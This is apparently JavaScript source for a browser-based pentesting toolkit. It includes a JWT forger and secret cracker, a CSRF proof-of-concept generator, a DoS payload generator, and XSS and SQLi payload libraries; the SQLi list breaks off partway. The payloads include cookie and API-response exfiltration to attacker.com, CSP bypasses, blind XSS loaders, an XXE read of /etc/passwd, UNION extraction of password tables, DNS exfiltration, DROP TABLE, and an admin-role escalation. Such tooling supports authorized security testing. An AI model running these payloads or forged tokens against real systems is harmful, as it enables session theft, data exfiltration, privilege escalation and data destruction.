    $('#hid-clear').addEventListener('click', () => {
      $('#hid-input').value = '';
      $('#hid-results').style.display = 'none';
    });
  }
};

// ===== JWT DECODER =====
TOOLS['jwt'] = {
  title: 'JWT Decoder / Editor',
  desc: 'Decode, edit, and re-sign JSON Web Tokens. Supports alg=none and HS256 weak-secret resigning.',
  render() {
    return `
      <div class="tool">
        <div class="card">
          <div class="card-title">JWT Token</div>
          <div class="field">
            <textarea id="jwt-input" rows="4" placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."></textarea>
          </div>
          <div class="btn-row">
            <button class="btn" id="jwt-decode">Decode &amp; Edit</button>
          </div>
        </div>

        <div class="card" id="jwt-results" style="display:none">
          <div class="card-title">Decoded</div>
          <div id="jwt-output"></div>
        </div>

        <div class="card" id="jwt-editor" style="display:none">
          <div class="card-title">Edit &amp; Re-sign Token</div>
          <p style="color:var(--text-mute);font-size:12px;margin-bottom:12px">Modify the header or payload below, then rebuild a new token. Use <strong>alg=none</strong> to test missing-signature bugs, or <strong>HS256</strong> with a guessed secret to forge a valid token.</p>
          <div class="field">
            <label>Header (JSON)</label>
            <textarea id="jwt-edit-header" rows="4" class="mono"></textarea>
          </div>
          <div class="field">
            <label>Payload (JSON)</label>
            <textarea id="jwt-edit-payload" rows="6" class="mono"></textarea>
          </div>
          <div class="field-row">
            <div class="field">
              <label>Signing</label>
              <select id="jwt-sign-alg">
                <option value="none">alg=none (no signature)</option>
                <option value="HS256">HS256 (HMAC-SHA256)</option>
                <option value="HS384">HS384 (HMAC-SHA384)</option>
                <option value="HS512">HS512 (HMAC-SHA512)</option>
                <option value="keep">Keep original signature</option>
              </select>
            </div>
            <div class="field">
              <label>Secret (HMAC only)</label>
              <input type="text" id="jwt-secret" placeholder="secret / leak / weak-key">
            </div>
          </div>
          <div class="btn-row">
            <button class="btn" id="jwt-rebuild">Rebuild Token</button>
            <button class="btn btn-secondary" id="jwt-crack">Try Common Secrets</button>
          </div>
          <div class="field" style="margin-top:12px">
            <label>New Token</label>
            <textarea id="jwt-output-token" rows="4" class="mono" readonly></textarea>
          </div>
          <div class="btn-row">
            <button class="btn btn-ghost" id="jwt-copy-new">Copy</button>
          </div>
          <div id="jwt-edit-status" style="margin-top:8px;font-size:12px;color:var(--text-mute)"></div>
        </div>
      </div>
    `;
  },
  init() {
    // ===== Base64url helpers =====
    const b64uDecode = (s) => {
      const norm = s.replace(/-/g, '+').replace(/_/g, '/');
      const pad = norm + '='.repeat((4 - norm.length % 4) % 4);
      return atob(pad);
    };
    const b64uEncode = (s) => btoa(s).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
    const b64uEncodeBytes = (bytes) => {
      let bin = '';
      for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
      return btoa(bin).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
    };

    // ===== HMAC sign with Web Crypto =====
    const hmacSign = async (data, secret, hash) => {
      const enc = new TextEncoder();
      const key = await crypto.subtle.importKey('raw', enc.encode(secret), { name: 'HMAC', hash }, false, ['sign']);
      const sig = await crypto.subtle.sign('HMAC', key, enc.encode(data));
      return new Uint8Array(sig);
    };

    const hashMap = { HS256: 'SHA-256', HS384: 'SHA-384', HS512: 'SHA-512' };

    // ===== Decode flow (existing behavior) =====
    const doDecode = () => {
      const t = $('#jwt-input').value.trim();
      const parts = t.split('.');
      if (parts.length !== 3) {
        toast('Invalid JWT format');
        return null;
      }
      const decodeJson = (s) => {
        try { return JSON.stringify(JSON.parse(b64uDecode(s)), null, 2); }
        catch { return '(invalid base64)'; }
      };
      const out = $('#jwt-output');
      out.innerHTML = `
        <div class="jwt-section">
          <div class="jwt-label jwt-header">HEADER</div>
          <div class="result-box" style="color:#ef4444">${escapeHtml(decodeJson(parts[0]))}</div>
        </div>
        <div class="jwt-section">
          <div class="jwt-label jwt-payload">PAYLOAD</div>
          <div class="result-box" style="color:#a855f7">${escapeHtml(decodeJson(parts[1]))}</div>
        </div>
        <div class="jwt-section">
          <div class="jwt-label jwt-sig">SIGNATURE</div>
          <div class="result-box" style="color:#06b6d4">${escapeHtml(parts[2])}</div>
        </div>
      `;
      try {
        const payload = JSON.parse(b64uDecode(parts[1]));
        if (payload.exp || payload.iat) {
          const meta = el('div', { class: 'jwt-section' });
          let info = '';
          if (payload.iat) info += `<dt>Issued at</dt><dd>${new Date(payload.iat * 1000).toISOString()}</dd>`;
          if (payload.exp) {
            const expired = Date.now() > payload.exp * 1000 ? ' (EXPIRED)' : '';
            info += `<dt>Expires</dt><dd>${new Date(payload.exp * 1000).toISOString()}${expired}</dd>`;
          }
          meta.innerHTML = `<div class="jwt-label">CLAIMS</div><dl class="info-grid">${info}</dl>`;
          out.appendChild(meta);
        }
      } catch {}
      $('#jwt-results').style.display = 'block';

      // Auto-populate the editor so it's always visible after decoding
      try {
        $('#jwt-edit-header').value = JSON.stringify(JSON.parse(b64uDecode(parts[0])), null, 2);
        $('#jwt-edit-payload').value = JSON.stringify(JSON.parse(b64uDecode(parts[1])), null, 2);
        $('#jwt-editor').style.display = 'block';
        $('#jwt-edit-status').textContent = 'Edit the header or payload above, choose a signing strategy, then Rebuild Token.';
        $('#jwt-edit-status').style.color = 'var(--text-mute)';
        const h = JSON.parse($('#jwt-edit-header').value);
        if (['none', 'HS256', 'HS384', 'HS512'].includes(h.alg)) $('#jwt-sign-alg').value = h.alg;
      } catch (e) {
        toast('Could not parse JWT JSON for editor: ' + e.message);
      }

      return parts;
    };

    $('#jwt-decode').addEventListener('click', doDecode);

    // ===== Rebuild =====
    const setEditStatus = (msg, isErr) => {
      const el = $('#jwt-edit-status');
      el.textContent = msg;
      el.style.color = isErr ? 'var(--danger)' : 'var(--success)';
    };

    const rebuild = async () => {
      let header, payload;
      try { header = JSON.parse($('#jwt-edit-header').value); }
      catch (e) { return setEditStatus('Invalid header JSON: ' + e.message, true); }
      try { payload = JSON.parse($('#jwt-edit-payload').value); }
      catch (e) { return setEditStatus('Invalid payload JSON: ' + e.message, true); }

      const alg = $('#jwt-sign-alg').value;
      const secret = $('#jwt-secret').value;

      // Force the alg field in header to match the chosen signing strategy
      if (alg !== 'keep') header.alg = alg;

      const headerB64 = b64uEncode(JSON.stringify(header));
      const payloadB64 = b64uEncode(JSON.stringify(payload));
      const signingInput = `${headerB64}.${payloadB64}`;

      let sigB64 = '';
      try {
        if (alg === 'none') {
          sigB64 = '';
        } else if (alg === 'keep') {
          // Keep the original signature from the input token
          const orig = $('#jwt-input').value.trim().split('.')[2] || '';
          sigB64 = orig;
        } else if (alg in hashMap) {
          if (!secret) return setEditStatus('Secret required for HMAC signing', true);
          const sig = await hmacSign(signingInput, secret, hashMap[alg]);
          sigB64 = b64uEncodeBytes(sig);
        } else {
          return setEditStatus('Unsupported alg: ' + alg, true);
        }
      } catch (e) {
        return setEditStatus('Sign failed: ' + e.message, true);
      }

      const newToken = `${signingInput}.${sigB64}`;
      $('#jwt-output-token').value = newToken;
      setEditStatus(`Rebuilt with alg=${header.alg} (${newToken.length} chars)`);
    };

    $('#jwt-rebuild').addEventListener('click', rebuild);

    // ===== Try common secrets (HS256/384/512) =====
    const COMMON_SECRETS = [
      'secret', 'password', '123456', 'admin', 'jwt', 'jwtsecret', 'jwt_secret',
      'your-256-bit-secret', 'your-secret-key', 'mysecret', 'test', 'changeme',
      'supersecret', 'topsecret', 'qwerty', 'letmein', 'default', 'key', 'token',
      ''
    ];

    $('#jwt-crack').addEventListener('click', async () => {
      const t = $('#jwt-input').value.trim();
      const parts = t.split('.');
      if (parts.length !== 3) return setEditStatus('Decode a token first', true);
      let header;
      try { header = JSON.parse(b64uDecode(parts[0])); }
      catch { return setEditStatus('Invalid header in token', true); }
      const alg = header.alg;
      if (!(alg in hashMap)) return setEditStatus(`Token alg "${alg}" is not HMAC - cannot brute-force here`, true);

      const target = parts[2];
      const signingInput = `${parts[0]}.${parts[1]}`;
      setEditStatus(`Trying ${COMMON_SECRETS.length} common secrets against ${alg}...`);
      for (const s of COMMON_SECRETS) {
        try {
          const sig = await hmacSign(signingInput, s, hashMap[alg]);
          if (b64uEncodeBytes(sig) === target) {
            $('#jwt-secret').value = s;
            $('#jwt-sign-alg').value = alg;
            return setEditStatus(`CRACKED! secret = "${s || '(empty)'}" - filled into Secret field`);
          }
        } catch {}
      }
      setEditStatus('No match in the common secrets list. Try a real wordlist offline (jwt_tool, hashcat -m 16500).', true);
    });

    $('#jwt-copy-new').addEventListener('click', () => copy($('#jwt-output-token').value));
  }
};

// ===== CLASSIC CIPHERS =====
TOOLS['cipher'] = {
  title: 'Classic Ciphers',
  desc: 'ROT13, Caesar, Atbash, and reverse',
  render() {
    return `
      <div class="tool">
        <div class="card">
          <div class="card-title">Input</div>
          <div class="field">
            <textarea id="cip-input" placeholder="enter text..."></textarea>
          </div>
          <div class="field">
            <label>Caesar shift (for Caesar cipher)</label>
            <input type="number" id="cip-shift" value="13">
          </div>
          <div class="btn-row">
            <button class="btn" data-cmd="rot13">ROT13</button>
            <button class="btn" data-cmd="caesar">Caesar</button>
            <button class="btn" data-cmd="atbash">Atbash</button>
            <button class="btn" data-cmd="reverse">Reverse</button>
          </div>
        </div>
        <div class="card" id="cip-results" style="display:none">
          <div class="result-header"><h4>Output</h4><button class="btn btn-ghost" id="cip-copy">Copy</button></div>
          <div class="result-box" id="cip-output"></div>
        </div>
      </div>
    `;
  },
  init() {
    const caesar = (s, n) => s.replace(/[a-z]/gi, c => {
      const base = c <= 'Z' ? 65 : 97;
      return String.fromCharCode((c.charCodeAt(0) - base + n + 26) % 26 + base);
    });
    const atbash = s => s.replace(/[a-z]/gi, c => {
      const base = c <= 'Z' ? 65 : 97;
      return String.fromCharCode(25 - (c.charCodeAt(0) - base) + base);
    });
    $$('[data-cmd]', $('#cip-input').closest('.card')).forEach(b => {
      b.addEventListener('click', () => {
        const cmd = b.dataset.cmd;
        const txt = $('#cip-input').value;
        const n = parseInt($('#cip-shift').value) || 0;
        let r;
        if (cmd === 'rot13') r = caesar(txt, 13);
        else if (cmd === 'caesar') r = caesar(txt, n);
        else if (cmd === 'atbash') r = atbash(txt);
        else if (cmd === 'reverse') r = txt.split('').reverse().join('');
        $('#cip-output').textContent = r;
        $('#cip-results').style.display = 'block';
      });
    });
    $('#cip-copy').addEventListener('click', () => copy($('#cip-output').textContent));
  }
};

// ============================================================
// EXPLOITATION TOOLS
// ============================================================

// ===== CSRF POC CREATOR =====
TOOLS['csrf-poc'] = {
  title: 'CSRF PoC Generator',
  desc: 'Paste a raw HTTP request and generate an HTML form PoC',
  render() {
    return `
      <div class="tool">
        <div class="card">
          <div class="card-title">Raw HTTP Request</div>
          <div class="field">
            <label>Paste the raw request (request line + headers + blank line + body)</label>
            <textarea id="csrf-raw" rows="14" placeholder="POST /api/action HTTP/1.1&#10;Host: target.com&#10;Content-Type: application/x-www-form-urlencoded&#10;&#10;name=evil&email=attacker@example.com"></textarea>
          </div>
          <div class="field-row">
            <div class="field">
              <label>Scheme</label>
              <select id="csrf-scheme">
                <option value="https">HTTPS</option>
                <option value="http">HTTP</option>
              </select>
            </div>
            <div class="field">
              <label>Submission</label>
              <select id="csrf-submit">
                <option value="auto">Auto-submit</option>
                <option value="button">Require submit button</option>
              </select>
            </div>
          </div>
          <div class="btn-row">
            <button class="btn" id="csrf-gen">Generate</button>
          </div>
        </div>
        <div class="card" id="csrf-results" style="display:none">
          <div class="result-header">
            <h4>Generated PoC</h4>
            <div>
              <button class="btn btn-ghost" id="csrf-copy">Copy</button>
              <button class="btn btn-ghost" id="csrf-dl">Download .html</button>
            </div>
          </div>
          <div class="result-box" id="csrf-output"></div>
        </div>
      </div>
    `;
  },
  init() {
    const parseRaw = (raw) => {
      const norm = raw.replace(/\r\n/g, '\n').trim();
      if (!norm) throw new Error('Empty request');
      const sepIdx = norm.indexOf('\n\n');
      const headPart = sepIdx === -1 ? norm : norm.slice(0, sepIdx);
      const body = sepIdx === -1 ? '' : norm.slice(sepIdx + 2);
      const lines = headPart.split('\n');
      const reqLine = lines.shift();
      const m = reqLine.match(/^(\S+)\s+(\S+)\s+\S+/);
      if (!m) throw new Error('Invalid request line');
      const method = m[1].toUpperCase();
      const path = m[2];
      const headers = {};
      lines.forEach(l => {
        const i = l.indexOf(':');
        if (i === -1) return;
        headers[l.slice(0, i).trim().toLowerCase()] = l.slice(i + 1).trim();
      });
      return { method, path, headers, body };
    };

    const parseFormBody = (body) => {
      const out = [];
      body.split('&').forEach(p => {
        if (!p) return;
        const i = p.indexOf('=');
        const k = i === -1 ? p : p.slice(0, i);
        const v = i === -1 ? '' : p.slice(i + 1);
        try { out.push([decodeURIComponent(k.replace(/\+/g, ' ')), decodeURIComponent(v.replace(/\+/g, ' '))]); }
        catch { out.push([k, v]); }
      });
      return out;
    };

    const buildPoc = () => {
      const raw = $('#csrf-raw').value;
      const scheme = $('#csrf-scheme').value;
      const autoSubmit = $('#csrf-submit').value === 'auto';
      const req = parseRaw(raw);
      const host = req.headers['host'];
      if (!host) throw new Error('Missing Host header');

      // Split query string off the path so it doesn't end up in form action twice
      const qIdx = req.path.indexOf('?');
      const pathOnly = qIdx === -1 ? req.path : req.path.slice(0, qIdx);
      const queryStr = qIdx === -1 ? '' : req.path.slice(qIdx + 1);
      const url = `${scheme}://${host}${pathOnly}`;

      const ct = (req.headers['content-type'] || '').toLowerCase();
      let enctype = '';
      if (ct.includes('multipart/form-data')) enctype = ' enctype="multipart/form-data"';
      else if (ct.includes('text/plain')) enctype = ' enctype="text/plain"';
      else enctype = ' enctype="application/x-www-form-urlencoded"';

      // GET/HEAD: params come from the query string. Otherwise: from the body.
      const params = ['GET', 'HEAD'].includes(req.method)
        ? parseFormBody(queryStr)
        : parseFormBody(req.body);
      const inputs = params.map(([k, v]) => `    <input type="hidden" name="${escapeHtml(k)}" value="${escapeHtml(v)}">`).join('\n');

      const formMethod = req.method === 'GET' ? 'GET' : 'POST';
      const submitBtn = autoSubmit ? '' : '\n    <input type="submit" value="Submit request">';
      const autoScript = autoSubmit ? '\n  <script>document.getElementById("csrfForm").submit();</script>' : '';

      return `<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
  <form id="csrfForm" action="${escapeHtml(url)}" method="${formMethod}"${enctype}>
${inputs}${submitBtn}
  </form>${autoScript}
</body>
</html>`;
    };

    const showOut = (s) => {
      $('#csrf-output').textContent = s;
      $('#csrf-results').style.display = 'block';
    };

    $('#csrf-gen').addEventListener('click', () => {
      try { showOut(buildPoc()); }
      catch (e) { toast('Error: ' + e.message); }
    });
    $('#csrf-copy').addEventListener('click', () => copy($('#csrf-output').textContent));
    $('#csrf-dl').addEventListener('click', () => download('csrf-poc.html', $('#csrf-output').textContent, 'text/html'));
  }
};

// ===== DOS PAYLOAD GENERATOR =====
TOOLS['dos-gen'] = {
  title: 'DoS Payload Generator',
  desc: 'Generate large repeated payloads for input validation testing',
  render() {
    return `
      <div class="tool">
        <div class="card">
          <div class="card-title">Payload Configuration</div>
          <div class="field">
            <label>Text input</label>
            <input type="text" id="dos-text" value="a">
          </div>
          <div class="field-row-3">
            <div class="field">
              <label>Repetition count</label>
              <input type="number" id="dos-count" value="1000">
            </div>
            <div class="field">
              <label>Separator (optional)</label>
              <input type="text" id="dos-sep" placeholder="e.g. /">
            </div>
            <div class="field">
              <label>Filename</label>
              <input type="text" id="dos-file" value="payload.txt">
            </div>
          </div>
          <div class="btn-row">
            <button class="btn" id="dos-gen">Generate &amp; Download</button>
            <button class="btn btn-secondary" id="dos-preview">Preview</button>
          </div>
        </div>
        <div class="card" id="dos-results" style="display:none">
          <div class="result-header">
            <h4>Preview <span id="dos-size" style="color:var(--text-mute);font-weight:400;font-size:11px"></span></h4>
            <button class="btn btn-ghost" id="dos-copy">Copy</button>
          </div>
          <div class="result-box" id="dos-output"></div>
        </div>
      </div>
    `;
  },
  init() {
    const build = () => {
      const text = $('#dos-text').value;
      const count = parseInt($('#dos-count').value) || 0;
      const sep = $('#dos-sep').value;
      if (!text || !count) { toast('Need text and count'); return null; }
      return Array(count).fill(text).join(sep);
    };
    $('#dos-gen').addEventListener('click', () => {
      const payload = build();
      if (payload == null) return;
      const file = $('#dos-file').value || 'payload.txt';
      download(file, payload);
      toast(`Generated ${payload.length} bytes`);
    });
    $('#dos-preview').addEventListener('click', () => {
      const payload = build();
      if (payload == null) return;
      const preview = payload.length > 5000 ? payload.slice(0, 5000) + '\n... [truncated]' : payload;
      $('#dos-output').textContent = preview;
      $('#dos-size').textContent = `(${payload.length.toLocaleString()} bytes)`;
      $('#dos-results').style.display = 'block';
    });
    $('#dos-copy').addEventListener('click', () => copy(build() || ''));
  }
};

// ===== XSS PAYLOAD LIBRARY =====
// ===== Shared Payload Library Renderer =====
// Data sourced from 1000+ real bug bounty reports across multiple resources.
const PL_CREDIT = `Data sourced from <b>1000+ real bug bounty reports</b>, public writeups, PortSwigger, HackTricks, PayloadsAllTheThings, and curated personal notes. Use only on systems you are authorized to test.`;

const renderPayloadLibrary = (cardTitle, sections, tips) => {
  const sectionsHtml = sections.map((sec, sIdx) => `
    <div class="pl-cat" data-cat>
      ${escapeHtml(sec.name)}
      ${sec.note ? `<div class="pl-cat-note">${escapeHtml(sec.note)}</div>` : ''}
    </div>
    <div class="payload-list">
      ${sec.items.map(it => {
        const p = it.p, d = it.d || '';
        const j = JSON.stringify(p).replace(/"/g, '&quot;');
        const main = it.link
          ? `<a class="pl-link" href="${escapeHtml(p)}" target="_blank" rel="noopener noreferrer">${escapeHtml(p)}</a>`
          : `<code>${escapeHtml(p)}</code>`;
        const desc = it.recommended
          ? `<span class="pl-desc"><strong class="pl-recommended">${escapeHtml(d)}</strong></span>`
          : `<span class="pl-desc">${escapeHtml(d)}</span>`;
        return `
          <div class="payload-item" data-payload>
            ${main}
            ${desc}
            <button class="btn btn-ghost" data-copy="${j}">Copy</button>
          </div>
        `;
      }).join('')}
    </div>
  `).join('');

  const tipsHtml = (tips || []).map(t => `<div class="pl-tip"><b>${escapeHtml(t.title)}:</b> ${escapeHtml(t.body)}</div>`).join('');

  return `
    <div class="tool">
      <div class="card">
        <div class="card-title">${escapeHtml(cardTitle)}</div>
        <div class="pl-credit">${PL_CREDIT}</div>
        <input type="text" class="input pl-search" placeholder="Filter payloads..." data-pl-search>
        ${tipsHtml}
        ${sectionsHtml}
      </div>
    </div>
  `;
};

const initPayloadLibrary = () => {
  document.querySelectorAll('[data-copy]').forEach(b => {
    b.addEventListener('click', () => {
      const txt = b.getAttribute('data-copy');
      navigator.clipboard.writeText(txt).then(() => toast('Copied'));
    });
  });
  const search = document.querySelector('[data-pl-search]');
  if (search) {
    search.addEventListener('input', () => {
      const q = search.value.toLowerCase();
      document.querySelectorAll('[data-payload]').forEach(item => {
        const txt = item.textContent.toLowerCase();
        item.style.display = !q || txt.includes(q) ? '' : 'none';
      });
      // hide empty categories
      document.querySelectorAll('[data-cat]').forEach(cat => {
        let n = cat.nextElementSibling;
        if (!n) return;
        const visible = Array.from(n.querySelectorAll('[data-payload]')).some(i => i.style.display !== 'none');
        cat.style.display = visible ? '' : 'none';
        n.style.display = visible ? '' : 'none';
      });
    });
  }
};

// ===== XSS PAYLOAD LIBRARY =====
TOOLS['xss-payloads'] = {
  title: 'XSS Payload Library',
  desc: 'Cross-Site Scripting payloads, bypasses & techniques from real bounty reports',
  render() {
    const sections = [
      { name: 'Basic Payloads', items: [
        { p: '<script>alert(1)</script>', d: 'Classic' },
        { p: '<img src=x onerror=alert(1)>', d: 'IMG onerror' },
        { p: '<svg onload=alert(1)>', d: 'SVG onload' },
        { p: '<body onload=alert(1)>', d: 'BODY onload' },
        { p: '<input autofocus onfocus=alert(1)>', d: 'Autofocus' },
        { p: '<details open ontoggle=alert(1)>', d: 'Details ontoggle' },
        { p: '<marquee onstart=alert(1)>', d: 'Marquee' },
        { p: '<x onclick=alert(1)>click</x>', d: 'Custom tag' },
        { p: '<iframe srcdoc="<script>alert(1)</script>">', d: 'Srcdoc' },
        { p: '<object data="javascript:alert(1)">', d: 'Object data' },
        { p: '<embed src="javascript:alert(1)">', d: 'Embed' },
      ]},
      { name: 'Context Escape', note: 'Break out of attributes, JS strings, comments', items: [
        { p: '"><script>alert(1)</script>', d: 'Double-quote attr' },
        { p: "'><script>alert(1)</script>", d: 'Single-quote attr' },
        { p: '"onmouseover=alert(1) x="', d: 'Attribute injection' },
        { p: "';alert(1);//", d: 'JS string break' },
        { p: "\\';alert(1);//", d: 'Escaped quote' },
        { p: '</script><script>alert(1)</script>', d: 'Script tag break' },
        { p: '*/alert(1)/*', d: 'JS comment break' },
        { p: '`-alert(1)-`', d: 'Template literal' },
      ]},
      { name: 'Filter & WAF Bypass', items: [
        { p: '<svg><script>alert&#40;1&#41;</script>', d: 'HTML entities' },
        { p: '<img src=x onerror="alert`1`">', d: 'No parens' },
        { p: '<svg/onload=eval(atob("YWxlcnQoMSk="))>', d: 'Base64 eval' },
        { p: '<script>onerror=alert;throw 1</script>', d: 'Throw → onerror' },
        { p: '<sCrIpT>alert(1)</sCrIpT>', d: 'Mixed case' },
        { p: '<script>alert(/xss/)</script>', d: 'Regex literal' },
        { p: '<a href="java&#09;script:alert(1)">x</a>', d: 'Tab in scheme' },
        { p: '<img src=x onerror=window[`al`+`ert`](1)>', d: 'String concat' },
        { p: '<svg><animate onbegin=alert(1) attributeName=x dur=1s>', d: 'SVG animate' },
        { p: '<iframe src="data:text/html,<script>alert(1)</script>">', d: 'Data URI iframe' },
      ]},
      { name: 'CSP Bypass', items: [
        { p: '<base href="javascript:/a/-alert(1)///">', d: 'Base href hijack' },
        { p: '<script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1)"></script>', d: 'JSONP gadget (Google)' },
        { p: "<link rel='preload' href='//attacker.com'>", d: 'Exfil via preload' },
        { p: '<form action=//attacker.com><input name=x value=1><input type=submit>', d: 'Form action exfil' },
        { p: '<iframe srcdoc="<script src=//attacker.com/x.js></script>">', d: 'Srcdoc bypass' },
      ]},
      { name: 'Cookie / Data Exfiltration', items: [
        { p: '<script>fetch("//attacker.com/?c="+document.cookie)</script>', d: 'Fetch cookie' },
        { p: '<img src=x onerror=this.src="//attacker.com/?"+document.cookie>', d: 'Image cookie' },
        { p: '<script>new Image().src="//attacker.com/?"+btoa(document.cookie)</script>', d: 'B64 image' },
        { p: '<script>navigator.sendBeacon("//attacker.com",document.cookie)</script>', d: 'Beacon' },
        { p: '<script>fetch("/api/me").then(r=>r.text()).then(t=>fetch("//attacker.com/?d="+btoa(t)))</script>', d: 'Steal API response' },
      ]},
      { name: 'DOM XSS Sinks', items: [
        { p: 'javascript:alert(1)', d: 'href / location sink' },
        { p: '#"><img src=x onerror=alert(1)>', d: 'Hash → innerHTML' },
        { p: '#<script>alert(1)</script>', d: 'location.hash sink' },
        { p: "');alert(1);//", d: 'eval / setTimeout sink' },
      ]},
      { name: 'AngularJS / Template Sandbox', items: [
        { p: "{{constructor.constructor('alert(1)')()}}", d: '1.6+' },
        { p: '{{$on.constructor(\'alert(1)\')()}}', d: '1.5' },
        { p: '{{[].pop.constructor(\'alert(1)\')()}}', d: 'Generic' },
        { p: "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}", d: '1.0.x' },
      ]},
      { name: 'mXSS / Mutation', items: [
        { p: '<noscript><p title="</noscript><img src=x onerror=alert(1)>">', d: 'noscript mutation' },
        { p: '<listing>&lt;img src=x onerror=alert(1)&gt;</listing>', d: 'listing tag' },
        { p: '<style><img src="</style><img src=x onerror=alert(1)>">', d: 'style escape' },
      ]},
      { name: 'File Upload XSS', note: 'Upload as image/svg/html and trigger rendering', items: [
        { p: '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>', d: 'SVG upload' },
        { p: 'GIF89a;<script>alert(1)</script>', d: 'Polyglot GIF/HTML' },
        { p: '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % p SYSTEM "file:///etc/passwd">%p;]>', d: 'XML upload (also XXE)' },
      ]},
      { name: 'Header / CRLF Injection', note: 'GitHub Pages: page_id with %00 → cookie injection → cache poison', items: [
        { p: '%0d%0aSet-Cookie:%20pwn=1', d: 'Set-Cookie injection' },
        { p: '%0d%0a%0d%0a<script>alert(1)</script>', d: 'CRLF body inject' },
        { p: '%E5%98%8D%E5%98%8A', d: 'UTF-8 CRLF bypass' },
      ]},
      { name: 'Polyglots', items: [
        { p: 'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"`/+/onmouseover=1/+/[*/[]/+alert(1)//\'>', d: 'Browns polyglot' },
        { p: '">\'><svg/onload=alert(1)>', d: 'Triple-context' },
      ]},
      { name: 'Blind XSS Probes', note: 'Use XSS Hunter / Interactsh - fires on admin panel views', items: [
        { p: '"><script src="//xsshunter.com/your_id"></script>', d: 'Hunter probe' },
        { p: '<script>$.getScript("//attacker.com/x.js")</script>', d: 'jQuery loader' },
      ]},
      { name: 'Blind XSS Webhook Provider', note: 'Sign up to get your probe ID, then plug it into the Blind XSS Probes above', items: [
        { p: 'https://xss.report/', d: 'Recommended', link: true, recommended: true },
        { p: 'https://xsshunter.trufflesecurity.com/', d: '', link: true },
        { p: 'https://bxsshunter.com', d: '', link: true },
      ]},
    ];
    return renderPayloadLibrary('XSS Payloads & Techniques', sections, []);
  },
  init() { initPayloadLibrary(); }
};

// ===== SQLi PAYLOAD LIBRARY =====
TOOLS['sqli-payloads'] = {
  title: 'SQLi Payload Library',
  desc: 'SQL Injection payloads & escalation techniques from real bug bounty reports',
  render() {
    const sections = [
      { name: 'Auth Bypass', items: [
        { p: "' OR '1'='1", d: 'Classic' },
        { p: "' OR 1=1--", d: 'With comment' },
        { p: "admin'--", d: 'Comment password' },
        { p: "admin'/*", d: 'Multi-line comment' },
        { p: "' OR 1=1 LIMIT 1--", d: 'LIMIT bypass' },
        { p: "') OR ('1'='1", d: 'Bracket escape' },
        { p: "1' OR '1'='1' /*", d: 'Mixed comment' },
        { p: '" OR ""="', d: 'Double quote' },
        { p: "' OR 1=1#", d: 'MySQL hash comment' },
      ]},
      { name: 'UNION-Based', note: 'First find column count with ORDER BY', items: [
        { p: "1' ORDER BY 1--", d: 'Column count probe' },
        { p: "' UNION SELECT NULL--", d: '1 col' },
        { p: "' UNION SELECT NULL,NULL--", d: '2 cols' },
        { p: "' UNION SELECT NULL,NULL,NULL--", d: '3 cols' },
        { p: "' UNION SELECT @@version,user(),database()--", d: 'Info gathering' },
        { p: "' UNION SELECT username,password FROM users--", d: 'Data extraction' },
        { p: "' UNION SELECT table_name,NULL FROM information_schema.tables--", d: 'List tables' },
        { p: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--", d: 'List columns' },
      ]},
      { name: 'Error-Based', items: [
        { p: "' AND extractvalue(1,concat(0x7e,version()))--", d: 'MySQL XPath' },
        { p: "' AND updatexml(1,concat(0x7e,(SELECT version())),1)--", d: 'MySQL updatexml' },
        { p: "' AND 1=CONVERT(int,(SELECT @@version))--", d: 'MSSQL convert' },
        { p: "' AND 1=cast((SELECT version()) as int)--", d: 'PostgreSQL cast' },
        { p: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", d: 'Double query' },
      ]},
      { name: 'Time-Based Blind', note: 'When no output is reflected. Top technique in bounty reports.', items: [
        { p: "' AND (SELECT SLEEP(5))--", d: 'MySQL' },
        { p: "' AND SLEEP(5)#", d: 'MySQL #' },
        { p: "' OR IF(1=1,SLEEP(5),0)--", d: 'MySQL conditional' },
        { p: "'; WAITFOR DELAY '0:0:5'--", d: 'MSSQL' },
        { p: "' AND pg_sleep(5)--", d: 'PostgreSQL' },
        { p: "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", d: 'Oracle' },
        { p: "1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--", d: 'PostgreSQL conditional' },
      ]},
      { name: 'Boolean Blind', items: [
        { p: "1' AND SUBSTRING(version(),1,1)='5", d: 'Char compare' },
        { p: "' OR ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--", d: 'Char extraction' },
        { p: "1 AND (SELECT COUNT(*) FROM users)>0", d: 'Table existence' },
        { p: "' AND 1=(SELECT COUNT(*) FROM tabname)--", d: 'Table probe' },
      ]},
      { name: 'OOB (Out-of-Band)', note: 'Use Burp Collaborator / Interactsh', items: [
        { p: "'; exec master..xp_dirtree '\\\\\\\\attacker.com\\\\a'--", d: 'MSSQL DNS' },
        { p: "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\\\a'))--", d: 'MySQL DNS exfil' },
        { p: "'; COPY (SELECT '') TO PROGRAM 'nslookup attacker.com'--", d: 'PostgreSQL OOB' },
      ]},
      { name: 'Stacked Queries', items: [
        { p: "'; DROP TABLE users--", d: 'MSSQL/Postgres' },
        { p: "'; INSERT INTO users(u,p) VALUES('a','b')--", d: 'Insert' },
        { p: "'; UPDATE users SET role='admin' WHERE u='attacker'--", d: 'Privilege escalation' },
      ]},
      { name: 'INSERT/UPDATE without commas', note: 'Apple SQLi technique - when commas filtered', items: [
        { p: "INSERT INTO t VALUES (SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b)", d: 'Comma-less values' },
        { p: "SELECT * FROM users WHERE id=1 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b", d: 'Comma-less union' },
      ]},
      { name: 'WAF Bypass', items: [
        { p: "%27%20OR%201%3D1--", d: 'URL encode' },
